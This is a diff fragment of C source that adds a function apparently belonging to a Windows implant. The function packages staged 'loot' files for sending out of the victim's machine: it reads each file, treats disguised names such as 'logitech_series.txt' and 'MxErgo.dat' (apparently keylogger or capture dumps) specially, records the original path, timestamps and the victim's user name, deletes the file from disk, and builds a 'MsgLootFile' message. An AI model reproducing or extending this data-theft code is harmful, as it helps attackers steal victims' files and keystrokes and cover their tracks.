+	LPWSTR lpFileName = NULL;
+	PENVELOPE pResult = NULL;
+	PPBElement Elements[8];
+	DWORD i = 0;
+	LPSTR lpOriginalPath = NULL;
+	LPSTR lpUserName = NULL;
+	PBYTE pFileData = NULL;
+	DWORD cbFileData = NULL;
+	PPBElement pFinalElement = NULL;
+	FILETIME CreationTime;
+	FILETIME LastAccessTime;
+	FILETIME LastWriteTime;
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	UINT64 uFileTime = 0;
+
+	SecureZeroMemory(Elements, sizeof(Elements));
+	lpFileName = PathFindFileNameW(lpFilePath);
+	if (!lstrcmpW(lpFileName, L"last.txt")) {
+		goto CLEANUP;
+	}
+
+	pFileData = ReadFromFile(lpFilePath, &cbFileData);
+	if (pFileData == NULL || cbFileData == 0) {
+		goto CLEANUP;
+	}
+
+	if (!lstrcmpW(lpFileName, L"logitech_series.txt")) {
+		if (cbFileData < 50000) {
+			goto CLEANUP;
+		}
+
+		Elements[3] = CreateVarIntElement(1, 4);
+	}
+	else if (!lstrcmpW(lpFileName, L"MxErgo.dat")) {
+		Elements[7] = CreateVarIntElement(1, 8);
+	}
+	else {
+		lpOriginalPath = (LPSTR)pFileData;
+		pFileData += lstrlenA(lpOriginalPath) + 1;
+		cbFileData -= lstrlenA(lpOriginalPath) + 1;
+		hFile = CreateFileW(lpFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFile != INVALID_HANDLE_VALUE) {
+			if (GetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime)) {
+				uFileTime = (((UINT64)CreationTime.dwHighDateTime) << 32) + CreationTime.dwLowDateTime;
+				Elements[4] = CreateVarIntElement(FILETIME_TO_UNIXMICRO(uFileTime), 5);
+				uFileTime = (((UINT64)LastAccessTime.dwHighDateTime) << 32) + LastAccessTime.dwLowDateTime;
+				Elements[5] = CreateVarIntElement(FILETIME_TO_UNIXMICRO(uFileTime), 6);
+				uFileTime = (((UINT64)LastWriteTime.dwHighDateTime) << 32) + LastWriteTime.dwLowDateTime;
+				Elements[6] = CreateVarIntElement(FILETIME_TO_UNIXMICRO(uFileTime), 7);
+			}
+			else {
+				LOG_ERROR("GetFileTime", GetLastError());
+			}
+		}
+		else {
+			LOG_ERROR("CreateFileW", GetLastError());
+		}
+
+		Elements[0] = CreateBytesElement(lpOriginalPath, lstrlenA(lpOriginalPath), 1);
+	}
+
+	DeleteFileW(lpFilePath);
+	lpUserName = GetComputerUserName();
+	Elements[1] = CreateBytesElement(lpUserName, lstrlenA(lpUserName), 2);
+	Elements[2] = CreateBytesElement(pFileData, cbFileData, 3);
+	pFinalElement = CreateStructElement(Elements, _countof(Elements), 0);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pFinalElement->pMarshaledData = NULL;
+	pResult->uType = MsgLootFile;
+CLEANUP:
+	if (hFile != INVALID_HANDLE_VALUE) {
+		CloseHandle(hFile);
+	}
+
+	FreeElement(pFinalElement);
+	FREE(lpOriginalPath);
+	FREE(lpUserName);
+
+	return pResult;
 }
